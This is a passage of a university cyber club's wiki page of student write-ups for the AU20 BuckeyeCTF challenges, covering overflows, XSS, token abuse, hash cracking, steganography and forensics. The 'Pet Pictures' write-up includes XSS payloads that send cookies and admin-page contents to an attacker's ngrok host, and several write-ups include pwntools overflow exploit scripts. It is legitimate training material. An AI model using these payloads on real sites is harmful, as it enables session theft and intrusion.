---
title: AU20 Write-ups
description: 
published: true
date: 2022-08-24T01:19:19.407Z
tags: 
editor: markdown
dateCreated: 2021-01-15T02:26:32.484Z
---

# AU20 BuckeyeCTF Write-ups

Questions, or want yours attributed to a different name? Email info@osucyber.club

Note the table of contents on the left is deceiving, and the formatting here is not great.

----

Challenge: Overflow
Write-Up Author: ctf-user-099
```
from pwn import *

p = remote('pwn.osucyber.club', 13373)

p.recvline()
p.sendline(b'A' * 16 + p32(0xcafebabe))

p.interactive()
```

-----

Challenge: toasted
Write-Up Author: ctf-user-077
toasted by WCSC

For this challenge, you'll want to be familiar with GET and POST requests in HTTP. 

When you visit the url, you'll find a website that controls a smart toaster. The website provides an API help, which has 6 methods available. Reading through them, two stuck out: 

* POST /api/generate_maintenance_token
* GET /api/download_backup (maintenance token required)

Maintenance usually has access to more functionality, so the backup seems to be where we will find the flag. We will need to generate a maintenance token. To do so, I mad a POST request to  http://pwn.osucyber.club:13372/api/generate_maintenance_token. This endpoint complained that I need an API token. Drat.

Looking through the website, the http://pwn.osucyber.club:13372/quick-toast page makes a request to the API. Taking a look at the Networks Developer Tools in Chrome, the API token can be found hardcoded in the Javascript: gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA

I now repeated the POST request for the maintenance token, but now we need a serial number. Making a GET request (http://pwn.osucyber.club:13372/api/status?token=gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA) to the status page, I found the following:

  {
    "status": 0,
    "data": {
        "model": "Hot Stuff 1337",
        "num_toasted": "34",
        "serial": "60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS",
        "time": "2020-10-24T00:01:23.119Z"
    }
}

Great, we have now the serial number now! I repeated the maintenance request again with both the token and serial, but this unfortunately still failed. I found adding the model number to the request, however, succeeded (the error message seems a bit misleading). This granted the token: 

{
    "status": 0,
    "token": "Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw"
}

Great! Now just ask for the flag at http://pwn.osucyber.club:13372/api/download_backup?token=Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw and you're good to go!


-----

Challenge: Magic Magic Bytes
Write-Up Author: ctf-user-121
Magic Magic Bytes Write-Up

Based on the challenge title, I expected this was a file with the magic number altered. Opening with HxD hex editor, I saw "PK" as the first bytes and suspected this was a PK zip file. Renamed the extension to .zip, and opened with 7zip to extract not_a_zip_file.zip, which I then open with HxD to get the flag.

-----

Challenge: Pet Pictures
Write-Up Author: ctf-user-077
Pet Pictures by WCSC

Wow, this is a cool challenge. I've done lots of XSS attacks, and read about this style, but never needed to perform one. This is definitely up there as one of my top 10 challenges.

Visiting the challenge url, http://pwn.osucyber.club:13378/, you are presented with Pet Pictures, a website for uploading pictures of your pets. Right off the bat, this challenge REEKS of cross-site scripting. In the top right, you can choose to submit a picture, and there is a big "Moderator" button. Any time I see a moderator on a challenge, I automatically assume I'll need to get the moderator to run some JS, and that's no different here.

To grab the cookies (because I assume we will want the moderator's cookies), we will want to use [ngrok](https://ngrok.com/). If you haven't used ngrok, it is a wonderful tool that provides a public URL that other's can use to connect to your machine. For this challenge, you don't need a web server running, as we will store the information in the URL. After firing up ngrok, I went to the submission page and placed the following code in all of the input fields:


    <script>
    document.write('<img src="http://da42d2740672.ngrok.io/collect.gif?cookie=' + document.cookie + '" />')
    </script>

This js appends the cookie to the ngrok URL, then places the img in the document to be loaded by the browser. I pulled up the ngrok terminal, and waited a few seconds, and poof! A request came in from the moderator. The cookie, however, was not there.

I poked around a bit and noticed the session cookie for this CTF is httponly! That means that the JS cannot retrieve it, it is only sent as part of an HTTP request. However, we did get code to run as the moderator. Instead of logging in, maybe we can just make the moderator do what we want as a proxy. I wasn't sure exactly what we needed to do, but clicking the moderator button brings up the url http://pwn.osucyber.club:13378/login?next=%2Fadmin. That next parameter with admin means there is an admin page at  http://pwn.osucyber.club:13378/admin and I wanted to see what was at that URL.

To do so, I modified the script to have the moderator load this page, and send the results back to my ngrok page instead of the cookie. The script I injected was:

    <script>
        var req = new XMLHttpRequest();   
        req.open('GET', 'http://pwn.osucyber.club:13378/admin', false);    
        req.send(null);   
        if(true) { 	
            console.log("HERE!"); 
            url = "	http://0c9e37513664.ngrok.io/collect.gif?cookie=";     
            result = req.responseText; 	
            url = url.concat(window.btoa(result));   
            document.write("<img src='" + url + "'></img>"); 
        }
    </script>

Similar to the previous script, this visits the admin page, concatenates the base64ed result with the ngrok url, then sends the result back to ngrok. Opening the ngrok terminal, we find the base64 encoded admin page.

    PCFkb2N0eXBlIGh0bWw CjxodG1sIGxhbmc9ImVuLVVTIj4KICA8aGVhZD4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvbWF0ZXJpYWxpemUvMS4wLjAvY3NzL21hdGVyaWFsaXplLm1pbi5jc3MiPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL21hdGVyaWFsaXplLzEuMC4wL2pzL21hdGVyaWFsaXplLm1pbi5qcyI PC9zY3JpcHQ CiAgICA8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2ljb24/ZmFtaWx5PU1hdGVyaWFsK0ljb25zIiByZWw9InN0eWxlc2hlZXQiPgoKICAgIAogICAgPHRpdGxlPkFkbWluPC90aXRsZT4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICA8ZGl2IGNsYXNzPSJuYXZiYXItZml4ZWQiPgogICAgPG5hdj4KICAgICAgPGRpdiBjbGFzcz0ibmF2LXdyYXBwZXIiPgogICAgICAgIDxhIGhyZWY9Ii8iIGNsYXNzPSJicmFuZC1sb2dvIGNlbnRlciI PGkgY2xhc3M9Im1hdGVyaWFsLWljb25zIj5wZXRzPC9pPlBldFBpY3R1cmVzPC9hPgogICAgICAgIDx1bCBjbGFzcz0icmlnaHQiPgogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9zdWJtaXQiPlN1Ym1pdDwvYT48L2xpPgogICAgICAgICAgCiAgICAgICAgICA8bGk PGEgaHJlZj0iL2xvZ291dCI TG9nb3V0PC9hPjwvbGk CiAgICAgICAgICAKICAgICAgICA8L3VsPgogICAgICA8L2Rpdj4KICAgIDwvbmF2PgogICAgCiAgICAgIAogICAgCiAgPC9kaXY CgogIAo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgCiAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbCBzMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXBhbmVsIGdyZXkgbGlnaHRlbi0yIj4KICAgICAgICAgICAgICAgIDxzcGFuPlBlbmRpbmcgQXBwcm92YWw6IDI8L3NwYW4 CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY CiAgICAKICAgIDxkaXYgY2xhc3M9InJvdyI CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBob3Jpem9udGFsIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1pbWFnZSI CiAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3VwbG9hZC8yZjRkZDEyZjgwZTY4OTFkY2M3Mzc2ZDVkMjlmM2FiOGRiYjg2NWUyIiBhbHQ9ImNseWRlIi8 CiAgICAgICAgICAgICAgICA8YSBjbGFzcz0iY2FyZC10aXRsZSI Q2x5ZGU8L2E CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPHA TW9kZXJhdG9yIE1lc3NhZ2U6IG9zdWN0ZntuM1YzUl83UnU1VF91czNyXzFOUFU3fTwvcD4KICAgICAgICAgICAgICAgIDxwPlN1Ym1pdHRlZCBCeTogV2F0c29uPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgCjwvZGl2PgoKICA8L2JvZHk CjwvaHRtbD4=
    
Decoding that gives the admin page, which contains the flag. Pretty awesome!

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-067
Unhashing
The "jibberish" inside `osuctf{...}` is a set of words that have been hashed using the sha1 hashing algorithm (note that `_` are used to separate hashes).  There are plenty of places where you can look up the unhashing. I used [https://md5hashing.net/hash](http://), but many other sources can get the job done. Copying each hash (again, remember that the `_` marks the end of a hash) and unhashing it will allow you to replace the hashes with their original words.

-----

Challenge: Overflow
Write-Up Author: ctf-user-077
Overflow by WCSC

This is a very simple buffer overflow. The catch is the following line.

    if (check == 0xcafebabe) {
    
We need to overflow the string buffer so that the check variable becomes 0xcafebabe. To do this, I used Python3 and Pwntools. Rather than trying to figure out exactly where the check variable lied in memory, I just filled it full of 0xcafebabe. The script to do so is below.

    from pwn import *
    p = remote("pwn.osucyber.club", 13373)
    payload = p32(0xcafebabe)
    p.sendline(payload*20) 
    p.interactive()

-----

Challenge: Right Address
Write-Up Author: ctf-user-077
Right Address by WCSC

This is another very simple buffer overflow. The catch is the following line.

Again, we will use Python3 and pwntools. In the process_order function gets is called. Using gdb, I looked up the address for print_spy_instructions which prints the flag. Like before, rather then determine the exact location of the return address, I just repeat the address over and over.

    from pwn import *
    p = remote("pwn.osucyber.club", 13374)
    payload = p32(0x08048626)
    p.sendline("1")
    p.sendline(payload*30) 
    p.interactive()

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-029
Beginner: Write-Up for Hash Mash
As a total beginner to CTF, this is what i did:
https://www.tunnelsup.com/hash-analyzer/ - to get the type of hash type
http://reverse-hash-lookup.online-domain-tools.com/ - to reverse the hash.
the ctf{...} is a SHA1 (or SHA 128) hash type and basically just paste each hash(seperated by _) into the second link.

-----

Challenge: Overflow
Write-Up Author: ctf-user-053
# Overflow Write-Up
Read the source code to see what value is being checked for the flag. In this case:
if (check == 0xcafebabe) {

Locally declared C variables are stored on the stack, such as the case with the check value. 
int check = 0;

Then look at how many characters the name is given.
#define NAME_LEN 16

We know that because the input isn't bounded in any way that the stack isn't protected. We can then change the value for check to match the given value in the code. We also know the given value isn't a string because of the 0x, indicating hex. 

Experiment with piping in different length strings along with hex letter combinations. This can show you how different lengths can give you a better idea of how overflowing the buffer can work.

Because we are writing to the stack we need to keep in mind both endianness and bytes for hex characters. 

Hex characters are paired up, so they look like this when you input them: 0xca0xfe0xba0xbe

When putting hex in a string you specify they are hex by putting: *\x* before the hex characters.

We determined the endianness and used echo to pipe in the string:
'1111111111111111\xbe\xba\xfe\xca'

This gave us the welcome message, but not the flag. This is to do with using echo and netcat together.

We ended up using pwntools to give the file the correct input.

-----

Challenge: Appetizing Donut Secret
Write-Up Author: ctf-user-042
7-zip, my hero

The first thing I tried was opening the file in 7-zip to get more info on it. Then, I discovered I could see more files inside of the Secrets file. I immediately fell for the bait images of assorted memes that were named like a solution. I eventually narrowed my search down to one file but it would not open for me. I right clicked the file and selected "alternate streams". This lead me to a textfile that contained the flag.

-----

Challenge: Tripped Over a String
Write-Up Author: ctf-user-053
# Tripped Over a String Write-Up

We downloaded the file, opened it to see what was in it, and found a bunch of random stuff in it. Because of the name of the problem, I ran strings on the file which returns all the string variables and comments in the file. This gave us the flag.

-----

Challenge: authbot
Write-Up Author: ctf-user-077
Authbot by WCSC

For this challenge, you need to connect to the Buckeye CTF and message the authbot. Send authbot the $help, as the challenge description hints at. This will bring up a list of commands, including the $info command. Running the $info command will print out a link to the github page for the bot.  https://github.com/qxxxb/auth_bot

If you visit that site, you can read the source code for the bot. In particular, there is one interesting function: cmd_debug_log. This command was not listed in the help section. Running it reveals the following output: 

    2020-10-23 23:39:08 INFO     Logged in as authbot#4452
    2020-10-23 23:39:13 DEBUG    User ath0#0294 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
    2020-10-23 23:40:06 DEBUG    User qxxxb#8938 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
    2020-10-24 00:05:53 DEBUG    User tips48#3559 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
    2020-10-24 00:07:23 DEBUG    User tips48#3559 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34

Whoops, looks like they were logging password hashes, and we got access! Run this through [CrackStation](https://crackstation.net/) shows the password is gobucks. Now, run the $auth command with the gobucks password, and you'll be added to the authbot-flag challenge on the discord. Congrats!

-----

Challenge: Magic Magic Bytes
Write-Up Author: ctf-user-053
# Magic Magic Bytes Write-Up
The file given was a zip folder that was given the wrong extension. I used mv to add the zip extension and unzipped it. Then the txt file had a zip extension, which I ignored and used cat to read the file.

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-055
Hash Potatos 
To solve for Hash Mash I realized that the given information was using a hash function based on the CTF101 information on types of encryptions that I every team was provided. Therefore, I took the given encryption 3e2e95f5ad970eadfa7e17eaf73da97024aa5359_2346ad27d7568ba9896f1b7da6b5991251debdf2_B47f363e2b430c0647f14deea3eced9b0ef300ce_Fc19318dd13128ce14344d066510a982269c241b_8fcd25a39d2037183044a8897e9a5333d727fded_b295d117135a9763da282e7dae73a5ca7d3e5b11 and placed it into a hash decoder. However, due to the underscore, I had to seperate each hash function by each _ which allowed me to receive 6 seperate words that when used in conjunction make the phrase "potato hash is good with salt". Therefore reaching the solution.
 

-----

Challenge: undelete
Write-Up Author: ctf-user-115
We get a file `battelle_files.tar.gz`

All we have to do is:

`tar -xzvf battelle_files.tar.gz`

and we get:

```
$ ls
ctfd-description.txt  flag  lipsum_generator.py  partition.img  README.md
$ cat flag
osuctf{d3l3t1ng_1sn7_ov3rwr1t1ng}
```

Pretty sure this was unintended....lol

-----

Challenge: Recently Watched
Write-Up Author: ctf-user-077
Recently Watched by WCSC

For this challenge, we downloaded the Chrome Cache tool from Nirsoft: https://www.nirsoft.net/utils/chrome_cache_view.html

We then opened the cache in this tool, which recovered many cached files and their URLs. Based on the Recently Watched title, we sorted by URL and searched for Youtube. The first one was pretty cool,[ check it out](https://www.youtube.com/watch?v=dQw4w9WgXcQ). But that was just a distraction. The second one was also pretty cool https://www.youtube.com/watch?v=IAKxlSplp-c, and if you sort the comments by most recent, you'll find the flag right at the top.

-----

Challenge: authbot
Write-Up Author: ctf-user-006
## authbot

You can't talk to the bot in the CTF server (as that would reveal the answers to other users), but you can message the bot through DM. You can try out each command to see what it does.

In particular, the `$auth` command seems to require a password.  Another
interesting command is `$info`, which will send a link to a GitHub of the bot's
[source code](https://github.com/qxxxb/auth_bot/blob/master/main.py).

```
2020-10-23 23:39:08 INFO     Logged in as authbot#4452
2020-10-23 23:39:13 DEBUG    User ath0#0294 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
```

You can then plug `c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34` into a hash
cracker like https://hashes.com/en/decrypt/hash.

This will tell you that the password is `gobucks`. After running `$auth gobucks`,
you'll get this message:
```
Successfully authenticated as admin on BuckeyeCTF
```

You can then go back to the CTF server and see that you now have the
`authenticated` role, which gives you access to the `authbot-flag` text channel, where you can
find the flag:

```
osuctf{osuctf{d0n7_lOG_y0UR_Au7h_57r1Ngs}}
```


-----

Challenge: Overflow
Write-Up Author: ctf-user-006
## Overflow

We can see that the `name` array is defined to have a length of 16 bytes. The `check` variable is defined before it, and the problem was compiled without a stack protector. This means that we can overflow `name` to set the value of `check`.

We can write a small Python script to create the payload:

```py
c1 = "1234567890123456"
c3 = "\xbe\xba\xfe\xca" # Little endian byte ordering

load = c1 + c3

with open('load', 'w') as load_file:
    load_file.write(load)
```

This will create a string with 16 ASCII characters followed by 4-bytes that equal `0xcafebabe`. Executing the python script saves the payload to a file named `load`. We can then send this payload to the executable by doing `cat load - | nc pwn.osucyber.club 13373`. After pressing enter, we now have access to a shell. To get the flag, we can do `cat flag`, which reveals `osuctf{expl01t1ng_5t4ck_l4y0ut}`

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-006
## Hash Mash

Formatting the text slightly, we get this:

```
3e2e95f5ad970eadfa7e17eaf73da97024aa5359
2346ad27d7568ba9896f1b7da6b5991251debdf2
b47f363e2b430c0647f14deea3eced9b0ef300ce
fc19318dd13128ce14344d066510a982269c241b
8fcd25a39d2037183044a8897e9a5333d727fded
b295d117135a9763da282e7dae73a5ca7d3e5b11
```

Since each of these consist of 40 hex digits, we can assume that they were generated from SHA-1. We can then use https://hashes.com/en/decrypt/hash to decode them. This gives us:
`osuctf{potato_hash_is_good_with_salt}`

-----

Challenge: Ride
Write-Up Author: ctf-user-006
## Ride

At first glance, it seems to be a huge list of floating point numbers. But upon closer inspection is seems that the values between every other element only seem to change slightly. Based on the context of the problem, these values seem to be XY coordinates.

To take advantage of this, we can first reformat the file using a simple script:
```py
with open('ride.txt') as f:
    with open('ride_col.txt', 'w') as fout:
        is_x = True
        for l in f.readlines():
            fout.write(l.strip())
            if is_x:
                fout.write(",")
            else:
                fout.write("\n")

            is_x ^= 1
```

This formats the file like so:
```
39.9561702,-82.9998764
39.9561111,-82.9998112
39.9561122,-82.9995704
39.9561573,-82.9993301
...
```

Then we can load this value into Excel and plot it as a scatter plot.
The resulting plot roughly resembles the `osuctf` prefix on the left, but is somewhat indecipherable.
But you can actually flip the image vertically to get a better view. After that, it becomes clear that the text says: `osuctf{OUTSID3}`

-----

Challenge: authbot
Write-Up Author: ctf-user-017
First off, I dm'd authbot $help. This brought up a menu with possible commands like:  
$ping  
$coinflip  
$auth  
$help  
$info  

I tried $info and got the message:  

I'm a super cool authentication bot  
Source code: https://github.com/qxxxb/auth_bot  
  
Going to that Github link leads us to custom authbot code with a list of all the commands plus one extra command: debug_log  
running $debug_log gets us this message  

2020-10-23 23:39:08 INFO     Logged in as authbot#4452
2020-10-23 23:39:13 DEBUG    User ath0#0294 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-23 23:40:06 DEBUG    User qxxxb#8938 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-24 00:05:53 DEBUG    User tips48#3559 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-24 00:07:23 DEBUG    User tips48#3559 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-24 00:08:22 DEBUG    User tips48#3559 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-24 01:35:35 DEBUG    User novafacing#7892 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-24 01:39:30 DEBUG    User coltsaw#3495 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-24 01:40:34 DEBUG    User Steeno#0618 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
2020-10-24 01:44:32 DEBUG    User coltsaw#3495 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34

The same hash (c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34) gets admin access over and over. We learn it's a sha-256 hash in the github code. Typing in this hash into an online tool to decrypt sha256 hashes gets us the password: gobucks.  
Now if we do $auth gobucks, we are authenticated as "admins" on the Buckeye CTF server. A new channel pops up with the flag in it.  
osuctf{d0n7_lOG_y0UR_Au7h_57r1Ngs}


-----

Challenge: No
Write-Up Author: ctf-user-006
## No

At first glance, it looked like there was some stego is going on with the image. After extracting the image using `pdfimages` and running it through some tools, I couldn't find anything. I then decided to analyze the PDF a little more closely. As I slowly scrolled through the output of `strings No.pdf`, I found: `You looking for something?` followed by `ZmxhZ3tUb3JvbnRvc1ByZXR0eUNvb2xFaD99`. This seemed to be a Base 64 encoded string. After decoding it using `echo ZmxhZ3tUb3JvbnRvc1ByZXR0eUNvb2xFaD99 | base64 -d`, I got `flag{TorontosPrettyCoolEh?}` 

-----

Challenge: toasted
Write-Up Author: ctf-user-006
## toasted

I found a `main.js` file using the Debugger in Firefox Devtools with the following code:
```js
// cart logic
$('#toast-form').submit(function (event) {
    var sec = $("#toast-time").val()
    $.post("/api/toast", {"token": "gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA", "time": sec}).done(function (data) {
        if (data.status == 0) {
            M.toast({html: data.message})
        }
    }).fail(function (xhr) {
        let data = JSON.parse(xhr.responseText);
        M.toast({html: data.error})
    })
})
```

Looks like there was a hardcoded token that we could use for the API calls.

I started by trying out every API call, with the token supplied. Eventually, I found that this gave me some interesting information with this call:

```bash
$ curl "http://pwn.osucyber.club:13372/api/status?token=${token}"

{"status":0,"data":{"model":"Hot Stuff 1337","num_toasted":"279","serial":"60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS","time":"2020-10-24T04:28:11.762Z"}}
```

Cool, we got a serial number and  the number of toasts toasted. Great. After some more poking around, we can see that `api/generate_maintenance_token` needs the serial number of the toaster. After supplying the serial number, we get a maintenance token: `Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw`.

Now we can call `api/download_backup` with this new token:
```bash
$ curl "http://pwn.osucyber.club:13372/api/download_backup?token=${mtoken}"
osuctf{dont_buy_an_int3rnet_connected_t0aster}
```

-----

Challenge: Logo
Write-Up Author: ctf-user-006
## Logo

Luckily `stegoveritas awesome_logo.png` was able to generate some interesting images. In particular `awesome_logo.png_Red_1.png` shows the flag very clearly as: `osuctf{k0N7RaS7_1s_PR377Y_k3wl}`

-----

Challenge: PATCHrick_Star
Write-Up Author: ctf-user-077
PATCHrick_Star by WCSC

For this challenge, you'll want some sort of software that's able to patch binaries. The demo version of binary ninja should work, but I did it using Ghidra and the awesome [savePatch Plugin](https://github.com/schlafwandler/ghidra_SavePatch).

For this challenge, there are a few places you'll want to patch. The first will be the two calls to the function print_patrick. Just nop those out, they don't do anything.

Next, you'll want to fix the loop in main so it doesn't run forever. You can also just jmp over it using gdb if you prefer. Here is the line you want to change and what you want to change it to.

        00400c96      80 bd bf fe ff ff 7f        CMP        byte ptr [RBP + -0x141],0x7f
        00400c96      80 bd bf fe ff ff 01        CMP        byte ptr [RBP + -0x141],0x1
  
Now let's take a look at the decrypt_flag function. At the if statement, it's simply setting the entire flag to 0 instead of writing the value we want as the if statement is always false. To fix this, I simply inverted the jmp following the compare. Instead of JNZ, I made the instruction JBE. You can tell if this works in Ghidra as suddenly the decompiler will share the branches as flipped.

Now, you can just run the program! 
                 


-----

Challenge: Doomba
Write-Up Author: ctf-user-099
# Unedited, super gross solve script.

[solve script removed so this challenge can be used for internal ctf]

-----

Challenge: Hash Mash
Write-Up Author: ctf-user-099
Using crackstation: https://crackstation.net/

```
3e2e95f5ad970eadfa7e17eaf73da97024aa5359	sha1	potato
2346ad27d7568ba9896f1b7da6b5991251debdf2	sha1	hash
b47f363e2b430c0647f14deea3eced9b0ef300ce	sha1	is
fc19318dd13128ce14344d066510a982269c241b	sha1	good
8fcd25a39d2037183044a8897e9a5333d727fded	sha1	with
b295d117135a9763da282e7dae73a5ca7d3e5b11	sha1	salt
```

-----

Challenge: PATCHrick_Star
Write-Up Author: ctf-user-099
Use binary ninja to patch out all of the 'nanosleep' calls.

There were a couple calls in main, and one in in the call to decrypt_flag.

-----

Challenge: Appetizing Donut Secret
Write-Up Author: ctf-user-099
I used xxd, piped the output into 'less' and searched for 'osuctf'

```
00016e70: 6573 706f 6f6e 2061 6374 6976 6520 6472  espoon active dr
00016e80: 7920 7965 6173 740a 332f 3420 6375 7020  y yeast.3/4 cup 
00016e90: 626c 6163 6b62 6572 7279 206a 616d 0a32  blackberry jam.2
00016ea0: 2071 7561 7274 7320 7665 6765 7461 626c   quarts vegetabl
00016eb0: 6520 6f69 6c20 666f 7220 6672 7969 6e67  e oil for frying
00016ec0: 0a6f 7375 6374 667b 7031 616e 6b37 306e  .osuctf{p1ank70n
00016ed0: 5f63 346e 375f 6e74 6635 7d0a 0000 0000  _c4n7_ntf5}.....
00016ee0: ffff ffff 0000 0000 0000 0000 0000 0000  ................
00016ef0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00016f00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00016f10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00016f20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

-----

Challenge: debugger
Write-Up Author: ctf-user-077
debugger by WCSC

If you download pwndbg, this is even easier, as the flag will show up immediately when you place the breakpoint. First, open the program in gdb. Type run. Next, run disass main to dissassemble the program. You can see the call to memset, which is the function that clears memory. This occurs at memory address  0x400647. Run b \*400647 to place a breakpoint, and run the program again. In pwndbg, you'll see the beginning of the flag in the dissassembly and on the stack.  You can now print the flag by printing the top of the stack: x/s $rsp



-----

Challenge: sus
Write-Up Author: ctf-user-115
We follow the tcp conversation, dump the hex of the program to a file, and open it up. We RE this and see that it accepts 2 commands over the wire, E and C.

C runs a command and captures up to 0x400 of the output. Cool. Anyway.

E sets the encryption key. We have in our packet capture that that key is "DontCallMeSecurely". We also have the ciphertext. So....lets just ignore the RE and decrypt.


```c
// gcc -o solvesus solvesus.c -lcrypto
#include <openssl/aes.h>
#include <stdio.h>

int main() {
    const unsigned char * userKey = "DontCallMeSecurely";
    const unsigned char peer1_175[] = { /* Packet 360 */
        0x0e, 0x44, 0xe0, 0xaa, 0x4c, 0x65, 0x59, 0xf0, 
        0xfa, 0x14, 0x1f, 0xe1, 0xc7, 0x36, 0xac, 0xe4 
    };
    const unsigned char peer1_176[] = { /* Packet 362 */
        0xae, 0x81, 0x44, 0x4a, 0x89, 0x0c, 0x5a, 0xb3, 
        0x80, 0xfc, 0x42, 0xf4, 0x3a, 0x97, 0x47, 0xba 
    };
    const unsigned char peer1_177[] = { /* Packet 364 */
        0x26, 0x50, 0x03, 0x40, 0x56, 0xeb, 0xa1, 0x5f, 
        0xea, 0x75, 0xa7, 0xbb, 0xc0, 0xa3, 0xde, 0x87 
    };
    unsigned char out1[17] = {0};
    unsigned char out2[17] = {0};
    unsigned char out3[17] = {0};
    const int bits = 0x80;
    AES_KEY k;
    AES_set_decrypt_key(userKey, bits, &k);
    AES_decrypt(peer1_175, out1, &k);
    AES_decrypt(peer1_176, out2, &k);
    AES_decrypt(peer1_177, out3, &k);
    printf("%s%s%s\n", out1, out2, out3);
}
```

-----

Challenge: Appetizing Donut Secret
Write-Up Author: ctf-user-029
Beginner: Appetizing Donut Secret
Open the file on an online hexadecimal editor (https://hexed.it/#base64:SECRETS.dsk;b3N1Y3Rme3AxYW5rNzBuX2M0bjdfbnRmNX0=) and just press ctrl+F

-----

Challenge: Tripped Over a String
Write-Up Author: ctf-user-115
All we need to do here is download the file `tripped_over_a_string.txt`.

Run `strings tripped_over_a_string.txt` and we get the flag in the output.

-----

Challenge: Magic Magic Bytes
Write-Up Author: ctf-user-115
If we run `file not_a_text_file.txt` we get `not_a_text_file.txt: Zip archive data, at least v2.0 to extract`. Run `unzip  not_a_text_file.txt` and we get a folder that contains a file with a .zip extension, but is actually text. Cat it to get flag.

-----

Challenge: Logo
Write-Up Author: ctf-user-115
Go to https://stegonline.georgeom.net/upload, upload the image, and click LSB. The flag will appear.

-----

Challenge: debugger
Write-Up Author: ctf-user-115
```python
for i in [87, 75, 77, 91, 76, 94, 67, 90, 74, 77, 76, 77, 75, 103, 84, 8, 78, 93, 75, 103, 90, 74, 11, 89, 83, 72, 87, 81, 86, 76, 75, 69]:
  print(chr(i ^ 0x38), end="")
```

-----

Challenge: authbot
Write-Up Author: ctf-user-115
If we look at the code, we see a hidden option that isn't listed on running $help: `$debug_log`

If we run that we get:
```
2020-10-23 23:39:08 INFO     Logged in as authbot#4452
2020-10-23 23:39:13 DEBUG    User ath0#0294 authed as admin with password hash c023d5796452ad1d80263a05d11dc2a42b8c19c5d7c88c0e84ae3731b73a3d34
```

Put this in crackstation and we get the password `gobucks`. Run `$auth gobucks` and we get access to the flag channel.

-----

Challenge: cord-great_white
Write-Up Author: ctf-user-115
We see a request for /flag.png...so go to File->Export Objects in wireshark and export that file. Open it `feh flag.png` and we get the flag.

-----

Challenge: Right Address
Write-Up Author: ctf-user-006
## Right Address

This is a stack smashing problem.

Open up the binary in `gdb`. Next find the address of `print_spy_instructions()`:
```gdb
(gdb) disassemble print_spy_instructions
Dump of assembler code for function print_spy_instructions:
   0x08048626 <+0>: push   %ebp
   0x08048627 <+1>: mov    %esp,%ebp
   0x08048629 <+3>: push   %ebx
...
```

The address we need is `0x08048626`.

Since we will be smashing the stack in `process_order()`, let's disassemble
it.

```gdb
